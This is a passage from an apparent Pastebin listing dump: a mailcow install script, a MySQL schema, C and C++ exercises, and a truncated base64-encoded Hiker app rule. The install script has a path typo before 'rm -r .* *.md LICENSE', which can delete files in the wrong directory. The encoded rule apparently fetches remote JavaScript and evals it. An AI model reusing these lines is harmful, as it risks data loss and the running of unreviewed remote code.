    }
    return 0;
}"
EyWWnwcw,Install mailcow,Justman10000,Bash,Sunday 28th of May 2023 09:29:57 AM CDT,"# You need Docker: https://pastebin.com/YTQNMvJw

mkdir /home/mailcow
cd /homw/mailcow
git init
git remote add origin https://github.com/mailcow/mailcow-dockerized.git
git pull origin master
bash generate_config.sh
rm -r .* *.md LICENSE
ln -s mailcow.conf .env
docker compose up -d"
WiKHwArJ,03. Many-To-Many Relationship,Nikola_944,MySQL,Sunday 28th of May 2023 09:29:14 AM CDT,"CREATE TABLE students (
    student_id INT PRIMARY KEY AUTO_INCREMENT,
    `name` VARCHAR(30) NOT NULL
)  AUTO_INCREMENT = 101;

CREATE TABLE exams (
    exam_id INT PRIMARY KEY AUTO_INCREMENT,
    `name` VARCHAR(30) NOT NULL
);

CREATE TABLE students_exams (
    student_id INT,
    exam_id INT,
    CONSTRAINT pk_students_exams PRIMARY KEY (exam_id , student_id),
    CONSTRAINT fk_students_exams_students FOREIGN KEY (student_id)
        REFERENCES students (student_id),
    CONSTRAINT fk_students_exams_exams FOREIGN KEY (exam_id)
        REFERENCES exams (exam_id)
);

INSERT INTO students (`name`)
VALUES ('Mila'), ('Toni'), ('Ron');

INSERT INTO exams (`name`)
VALUES ('Spring MVC'), ('Neo4j'), ('Oracle 11g');

INSERT INTO students_exams (student_id, exam_id)
VALUES
('1', '101'),
('1', '102'),
('2', '101'),
('3', '103'),
('2', '102'),
('2', '103');"
gdWqsCph,fibers,moldovexc,C,Sunday 28th of May 2023 09:19:43 AM CDT,"#include <ucontext.h>
#include <malloc.h>
#include <stdio.h>

#define FIBER_STACK 1024*64

ucontext_t uctx_func, uctx_main;

void fiber(){
    printf(""Fiber: started\n"");
    printf(""Fiber: Now swap context to main\n"");
    swapcontext(&uctx_func, &uctx_main);
    printf(""Fiber: returned\n"");
    printf(""Fiber: Now swap context to main again\n"");
    swapcontext(&uctx_func, &uctx_main);
}

int main(){
    getcontext(&uctx_func);
    uctx_func.uc_link = NULL;
    uctx_func.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func.uc_stack.ss_size = FIBER_STACK;
    uctx_func.uc_stack.ss_flags = 0;
    makecontext(&uctx_func, fiber, 0);

    printf(""Main: swap context to fiber\n"");
    swapcontext(&uctx_main, &uctx_func);

    printf(""Main: returned\n"");

    printf(""Main: swap context to fiber again\n"");
    swapcontext(&uctx_main, &uctx_func);

    printf(""Main: returned\n"");
    printf(""Main: exiting\n"");

    return 0;

}"
WSaUvPwS,Назад!,pasholnahuy,C++,Sunday 28th of May 2023 09:18:25 AM CDT,"#include <iostream>
#include <tuple>
#include <random>

using std::pair;
using std::cin;
using std::cout;

class InsertTree {
private:
    struct Node {
        int val;
        int size = 1;
        Node *left = nullptr;
        Node *right = nullptr;

        static int Size(Node *n) {
            if (n != nullptr) {
                return n->size;
            }
            return 0;
        }

        void Update() {
            size = Size(left) + Size(right) + 1;
        }
    };

    pair<Node *, Node *> Split(Node *n, int ind) {
        if (n == nullptr) {
            return {nullptr, nullptr};
        }
        if (Node::Size(n->left) >= ind) {
            auto [left, right] = Split(n->left, ind);
            n->left = right;
            n->Update();
            return {left, n};
        }
        auto [left, right] = Split(n->right, ind - Node::Size(n->left) - 1);
        n->right = left;
        n->Update();
        return {n, right};
    }

    static Node *Merge(Node *root1, Node *root2) {
        if (root1 == nullptr) {
            return root2;
        }
        if (root2 == nullptr) {
            return root1;
        }
        static std::minstd_rand rand_gen;
        if (std::uniform_int_distribution(1, Node::Size(root1) + Node::Size(root2))(rand_gen) <= Node::Size(root1)) {
            root1->right = Merge(root1->right, root2);
            root1->Update();
            return root1;
        }
        root2->left = Merge(root1, root2->left);
        root2->Update();
        return root2;
    }

    static Node *Build(int l, int r) {
        if (l >= r) {
            return nullptr;
        }
        Node *new_node = new Node{(l + r) / 2};
        new_node->left = Build(l, (l + r) / 2);
        new_node->right = Build((l + r) / 2 + 1, r);
        new_node->Update();
        return new_node;
    }
    void PrintNodes(Node* n){
        if (n == nullptr){
            return;
        }
        PrintNodes(n->left);
        cout << n->val << "" "";
        PrintNodes(n->right);
    }
public:
    explicit InsertTree(int size) : root(Build(1, size + 1)) {
    }
    void Cut(int l, int r){
        auto [less_eq_right, greater_right] = Split(root, r + 1);
        auto [less_left, between] = Split(less_eq_right, l);
//        root = Merge(Merge(between, less_left), greater_right);
        root = Merge(less_left, Merge(greater_right, between));
    }
    void PrintNodes(){
        PrintNodes(root);
    }
    Node* root = nullptr;

};

int main() {
    int n, k;
    cin >> n >> k;
    InsertTree it(n);
    for (int i = 0; i < k; ++i){
        int l, r;
        cin >> l >> r, --l, --r;
        it.Cut(l, r);
    }
    it.PrintNodes();
    return 0;
}"
gMcC9djD,邀您一起看：青春硬起来第1集在线播放 - LIBVIO,xiaomianao666,JavaScript,Sunday 28th of May 2023 09:11:01 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥青春硬起来第1集在线播放 - LIBVIO@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcInlzZnhcIixcInBhdGhcIjpcInlzZnhcIixcInJ1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxubGV0IHJ1bGUgPSBnZXRQYXJhbShcXFwiclxcXCIpLnNwbGl0KFxcXCIjI1xcXCIpWzBdO1xcbmxldCB1cmwgPSBNWV9VUkwuc3BsaXQoXFxcIiMjXFxcIilbMV07XFxubGV0IGl0ZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3VcXFwiKShydWxlLCBnZXRIb21lKHVybCkpO1xcbmxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICB0cnkge1xcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcbiAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgIH1cXG59KTtcXG5sZXQganMyID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKHJ1bGUsIHVybCk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCIxMDAlJiZmbG9hdFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXG4gICAgICAgIGpzOiBqcyArIFxcXCI7XFxcXG5cXFwiICsganMyLFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXG4gICAgICAgIGZsb2F0VmlkZW86IHRydWVcXG4gICAgfVxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogdXJsXFxuICAgIH1cXG59KTtcXG5zZXRSZXN1bHQoZCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCJ1XCIsXCJwYXRoXCI6XCJ1XCIsXCJydWxlXCI6XCIkLmV4cG9ydHMgPSBmdW5jdGlvbihydWxlLCBvcmlnaW4pIHtcXG4gICAgcmV0dXJuICQudG9TdHJpbmcoKHJ1bGUsIG9yaWdpbikgPT4ge1xcbiAgICAgICAgbGV0IGhvc3QgPSBvcmlnaW4ucmVwbGFjZShuZXcgUmVnRXhwKFxcXCJodHRwOi8vfGh0dHBzOi8vXFxcIiksIFxcXCJcXFwiKS5zcGxpdChcXFwiL1xcXCIpWzBdO1xcbiAgICAgICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFwiLlxcXCIpO1xcbiAgICAgICAgaWYgKGhvc3RzLmxlbmd0aCA+IDIpIHtcXG4gICAgICAgICAgICBob3N0ID0gaG9zdHNbaG9zdHMubGVuZ3RoIC0gMl0gKyBcXFwiLlxcXCIgKyBob3N0c1tob3N0cy5sZW5ndGggLSAxXTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXCJtYWduZXRcXFwiKSkge1xcbiAgICAgICAgICAgIGNvbmZpcm0oe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIua4qemmqOaPkOekulxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLmo4DmtYvliLDmlrDnmoTno4Hpk77lnLDlnYDvvIzngrnlh7vnoa7lrprmjInpkq7ljbPlj6/mkq3mlL7vvIzngrnlh7vlj5bmtojmjInpkq7lj6/ku6XlpI3liLbpk77mjqVcXFwiLFxcbiAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBtYWc7XFxuICAgICAgICAgICAgICAgIH0sIGlucHV0KSxcXG4gICAgICAgICAgICAgICAgY2FuY2VsOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyBtYWdcXG4gICAgICAgICAgICAgICAgfSwgaW5wdXQpXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICAgIH0gZWxzZSBpZiAoaW5wdXQuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlLmNvbVxcXCIpKSB7XFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXG4gICAgICAgICAgICBsZXQgcjEgPSBmZXRjaChcXFwiaGlrZXI6Ly9ob21lQOS6keebmOaxh+W9sVxcXCIpO1xcbiAgICAgICAgICAgIGlmICghcjEgfHwgcjEubGVuZ3RoIDw9IDUpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1ID0gJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcIua1t+mYlOinhueVjOinhOWImeWIhuS6q++8jOW9k+WJjeWIhuS6q+eahOaYr++8muWwj+eoi+W6j++/pWhvbWVfcnVsZV92Mu+/pWJhc2U2NDovL0DkupHnm5jmsYflvbFAZXlKc1lYTjBYMk5vWVhCMFpYSmZjblZzWlNJNklpSXNJblJwZEd4bElqb2k1THFSNTV1WTVyR0g1YjJ4SWl3aVlYVjBhRzl5SWpvaVRYSkdiSGtpTENKMWNtd2lPaUpvYVd0bGNqb3ZMMlZ0Y0hSNUpDUWtabmx3WVdkbElpd2lkbVZ5YzJsdmJpSTZOaXdpWTI5c1gzUjVjR1VpT2lKMFpYaDBYekVpTENKamJHRnpjMTl1WVcxbElqb2lJaXdpZEhsd1pTSTZJbUZzYkNJc0ltTnNZWE56WDNWeWJDSTZJaUlzSW1GeVpXRmZibUZ0WlNJNklpSXNJbUZ5WldGZmRYSnNJam9pSWl3aWMyOXlkRjl1WVcxbElqb2lJaXdpZVdWaGNsOXVZVzFsSWpvaUlpd2ljMjl5ZEY5MWNtd2lPaUlpTENKNVpXRnlYM1Z5YkNJNklpSXNJbVpwYm1SZmNuVnNaU0k2SW1wek9seHVaWFpoYkNobVpYUmphQ2duYUdsclpYSTZMeTltYVd4bGN5OXlkV3hsY3k5cFkza3ZZV3hwTG1wekp5a3BPMXh1WVd4cExtaHZiV1ZRWVdkbEtDazdJaXdpYzJWaGNtTm9YM1Z5YkNJNkltaHBhMlZ5T2k4dlpXMXdkSGtrSkNRcUtpUWtKR1o1Y0dGblpTUWtKQ0lzSW1keWIzVndJam9pNHBHZzU3MlI1NXVZSWl3aWMyVmhjbU5vUm1sdVpDSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG5ObFlYSmphRkJoWjJVb2RISjFaU2s3WEc0aUxDSmtaWFJoYVd4ZlkyOXNYM1I1Y0dVaU9pSnRiM1pwWlY4eElpd2laR1YwWVdsc1gyWnBibVJmY25Wc1pTSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG1SbGRHRnBiRkJoWjJVb0tUc2lMQ0p6WkdWMFlXbHNYMk52YkY5MGVYQmxJam9pYlc5MmFXVmZNU0lzSW5Oa1pYUmhhV3hmWm1sdVpGOXlkV3hsSWpvaUlpd2lkV0VpT2lKdGIySnBiR1VpTENKd2NtVlNkV3hsSWpvaWRtRnlJR0ZzYVdweklEMGdabVYwWTJnb0oyaDBkSEJ6T2k4dloybDBaV1V1WTI5dEwyWnNlVEV6T1RjdmFHbHJaWEl0YVdONUwzSmhkeTl0WVhOMFpYSXZZV3hwTG1wekp5azdYRzVwWmlnaFlXeHBhbk1nZkh3Z0lXRnNhV3B6TG1sdVkyeDFaR1Z6S0NkaGJHa25LU2w3WEc1Y2RHRnNhV3B6SUQwZ1ptVjBZMmdvSjJoMGRIQnpPaTh2WTJSdUxtcHpaR1ZzYVhaeUxtNWxkQzluYUM5bWJIa3hNemszTDJocGEyVnlMV2xqZVM5aGJHa3Vhbk1uS1Z4dWZWeHVhV1lvSVdGc2FXcHpJSHg4SUNGaGJHbHFjeTVwYm1Oc2RXUmxjeWduWVd4cEp5a3BlMXh1WEhSaGJHbHFjeUE5SUdabGRHTm9LQ2RvZEhSd09pOHZiR1pwWTNrdVkyOXRPak13TURBd0wyMXlabXg1TDJocGEyVnlMV2xqZVM5eVlYY3ZiV0Z6ZEdWeUwyRnNhUzVxY3ljcFhHNTlYRzVwWmloaGJHbHFjeWtnZTF4dVhIUjNjbWwwWlVacGJHVW9YQ0pvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5OY0lpeGhiR2xxY3lrN1hHNWNkR1YyWVd3b1lXeHBhbk1wTzF4dVhIUmhiR2t1Y0hKbFVuVnNaU2dwTzF4dWZWeHVJaXdpY0dGblpYTWlPaUpiZTF3aVkyOXNYM1I1Y0dWY0lqcGNJbTF2ZG1sbFh6TmNJaXhjSW01aGJXVmNJanBjSXVlOWtlZWJtT2l2cHVhRGhWd2lMRndpY0dGMGFGd2lPbHdpWkdWMFlXbHNYQ0lzWENKeWRXeGxYQ0k2WENKcWN6cGNYRzVsZG1Gc0tHWmxkR05vS0Nkb2FXdGxjam92TDJacGJHVnpMM0oxYkdWekwybGplUzloYkdrdWFuTW5LU2s3WEZ4dVlXeHBMbWx1YVhSRGIyNW1hV2NvS1R0Y1hHNWhiR2t1WVd4cFVuVnNaU2dwTzF3aWZTeDdYQ0pqYjJ4ZmRIbHdaVndpT2x3aWJXOTJhV1ZmTVY5c1pXWjBYM0JwWTF3aUxGd2libUZ0WlZ3aU9sd2k2TFdFNXJxUTU3MlI2YUcxNksrbTVvT0ZYQ0lzWENKd1lYUm9YQ0k2WENKemFYUmxMV1JsZEdGcGJGd2lMRndpY25Wc1pWd2lPbHdpYW5NNlhGeHVaWFpoYkNobVpYUmphQ2duYUdsclpYSTZMeTltYVd4bGN5OXlkV3hsY3k5cFkza3ZZV3hwTG1wekp5a3BPMXhjYm1Gc2FTNWtaWFJoYVd4UVlXZGxLQ2s3WENKOUxIdGNJbU52YkY5MGVYQmxYQ0k2WENKdGIzWnBaVjh6WENJc1hDSnVZVzFsWENJNlhDTGt1S3JrdXJybnZaSG5tNWpvcjZibWc0VmNJaXhjSW5CaGRHaGNJanBjSW1SeWFYWmxYQ0lzWENKeWRXeGxYQ0k2WENKcWN6cGNYRzVsZG1Gc0tHWmxkR05vS0Nkb2FXdGxjam92TDJacGJHVnpMM0oxYkdWekwybGplUzloYkdrdWFuTW5LU2s3WEZ4dVlXeHBMbWx1YVhSRGIyNW1hV2NvS1R0Y1hHNWhiR2t1YlhsQmJHbFNkV3hsS0NrN1hDSjlYU0lzSW1samIyNGlPaUpvZEhSd2N6b3ZMMmRwZEdWbExtTnZiUzltYkhreE16azNMMmhwYTJWeUxXbGplUzl5WVhjdmJXRnpkR1Z5TDJGc2FYbDFiaTV3Ym1jaWZRPT1cXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5rip6aao5o+Q56S6JyxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6ICfmnKzop4TliJnkvp3otZbkupHnm5jmsYflvbHop4TliJnvvIzngrnlh7vkuIvpnaLnmoTnoa7lrprmjInpkq7lr7zlhaXvvIzms6jmhI/lr7zlhaXlkI7kuIDlrpropoHlnKjkupHnm5jmsYflvbHnmbvlvZXpmL/ph4zkupHnm5jotKblj7fvvIzlkKbliJnkuI3og73nlKgnLFxcbiAgICAgICAgICAgICAgICAgICAgY29uZmlybTogcnUsXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IHJ1XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxvZyhcXFwiaW5wdXRcXFwiKTtcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIumYv+mHjOS6keebmFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvZGV0YWlsP3J1bGU95LqR55uY5rGH5b2xJnVybD1cXFwiICsgdXJsICsgJz8/ZnlwYWdlJyxcXG4gICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxuICAgICAgICB9IGVsc2UgaWYgKC9cXFxcLihtcDN8ZmxhY3xtNGEpJC8udGVzdChpbnB1dCkpIHtcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcbiAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wbGF5VmlkZW8odXJsKTtcXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSlcXG4gICAgICAgIH0gZWxzZSBpZiAoIWlucHV0LmluY2x1ZGVzKGhvc3QpICYmIGlucHV0LnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSkge1xcbiAgICAgICAgICAgIGxvZyhpbnB1dCk7XFxuICAgICAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgd2hpdGUgPSBbXFxuICAgICAgICAgICAgICAgICAgICBcXFwiZG91eWluXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJkb3ViYW5cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcIml4aWd1YS5jb21cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImt1YWlzaG91XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJiaWxpYmlsaVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwid2VpYm9cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcIndlaXhpblxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiYmFpZHVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInptay5cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInN1YmhkXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJ0aHVuZGVyXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJ4aW5qdWNcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImdyYWI0a1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiL2J0XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJqc3IxMFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiYXNzcnRcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInF1YXJrXFxcIlxcbiAgICAgICAgICAgICAgICBdO1xcbiAgICAgICAgICAgICAgICBsZXQgaW5XaGl0ZSA9IHdoaXRlLmZpbHRlcihpdCA9PiB1cmwuaW5jbHVkZXMoaXQpKS5sZW5ndGggPiAwO1xcbiAgICAgICAgICAgICAgICBpZiAoaW5XaGl0ZSkge1xcbiAgICAgICAgICAgICAgICAgICAgLy/ot7PnvZHpobVcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor6bmg4VcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcIiArIHJ1bGUgKyBcXFwiJnI9XFxcIiArIHJ1bGUgKyBcXFwiIyNcXFwiICsgdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAvL0FJ6Kej5p6QXFxuICAgICAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLm9wZW4oSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkb2N1bWVudC50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvcD9ydWxlPVxcXCIgKyBydWxlICsgXFxcIiZyPVxcXCIgKyBydWxlICsgXFxcIiZ1PVxcXCIgKyBmeV9icmlkZ2VfYXBwLmJhc2U2NEVuY29kZSh1cmwpLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgICAgICB9IGVsc2UgaWYgKCFpbnB1dC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcbiAgICAgICAgICAgIC8v6IO95ZSk6LW3QVBQ55qE55m95ZCN5Y2VXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcbiAgICAgICAgICAgICAgICBcXFwicWtsaW5rXFxcIixcXG4gICAgICAgICAgICAgICAgXFxcImJkbmV0ZGlza1xcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJ4dW5sZWlhcHBcXFwiXFxuICAgICAgICAgICAgXTtcXG4gICAgICAgICAgICBsZXQgaW5XaGl0ZSA9IHdoaXRlLmZpbHRlcihpdCA9PiBpbnB1dC5zdGFydHNXaXRoKGl0KSkubGVuZ3RoID4gMDtcXG4gICAgICAgICAgICBpZiAoIWluV2hpdGUpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwICYmIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwKHVybCk7XFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGxldCB3aGl0ZSA9IFtcXG4gICAgICAgICAgICAgICAgXFxcInVybD1cXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwiZnNvdS5jb21cXFwiLFxcbiAgICAgICAgICAgICAgICBcXFwiYmluZy5cXFwiLCAgICAgICAgICAgICAgICBcXG4gICAgICAgICAgICBdO1xcbiAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LmluY2x1ZGVzKGl0KSkubGVuZ3RoID4gMDtcXG4gICAgICAgICAgICBpZiAoaW5XaGl0ZSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCByZWcgPSBuZXcgUmVnRXhwKFxcXCJbXFxcXHU0ZTAwLVxcXFx1OWZhNV0rXFxcIiwgXFxcImdcXFwiKTtcXG4gICAgICAgICAgICBsZXQgciA9IGRlY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxuICAgICAgICAgICAgaWYgKHJlZy50ZXN0KHIpIHx8IChpbnB1dC5zdGFydHNXaXRoKG9yaWdpbikgJiYgaW5wdXQubGVuZ3RoIC0gb3JpZ2luLmxlbmd0aCA+IDIpKSB7XFxuICAgICAgICAgICAgICAgIC8v5pyJ5Lit5paH77yM5bqU6K+l5piv5Zyo5pCc57Si77yM6Lez5paw6aG16Z2iXFxuICAgICAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor6bmg4VcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcIiArIHJ1bGUgKyBcXFwiJnI9XFxcIiArIHJ1bGUgKyBcXFwiIyNcXFwiICsgdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9LCBydWxlLCBvcmlnaW4pO1xcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6jOe6p+ino+aekFwiLFwicGF0aFwiOlwicFwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmxldCBsaXN0ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFwid2hpdGVcXFwiLCBbXSk7XFxubGV0IGluV2hpdGUgPSBsaXN0LmluY2x1ZGVzKHVybCk7XFxubGV0IGQgPSBbXTtcXG5pZiAoIWluV2hpdGUpIHtcXG4gICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgIGxldCB3ZWIgPSBnZXRJdGVtKCd3ZWInLCAnMCcpID09IFxcXCIxXFxcIjtcXG4gICAgbGV0IHJ1bGUgPSBnZXRQYXJhbShcXFwiclxcXCIpO1xcbiAgICBsZXQgcGFyc2UgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9wYXJzZVxcXCIpO1xcbiAgICBkID0gcGFyc2UocnVsZSwgd2ViLCB1cmwsIGh0bWwpO1xcbn1cXG5pZiAoZC5sZW5ndGggPT0gMCkge1xcbiAgICAvL+WMuemFjeWksei0pVxcbiAgICBsZXQgaXRlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdVxcXCIpKGdldFBhcmFtKFxcXCJyXFxcIiksIGdldEhvbWUodXJsKSk7XFxuICAgIGxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBpZiAoZG9jdW1lbnQudGl0bGUgJiYgZG9jdW1lbnQudGl0bGUubGVuZ3RoKSB7XFxuICAgICAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXG4gICAgICAgICAgICAgICAgfSwgZG9jdW1lbnQudGl0bGUpO1xcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICAgICAgfV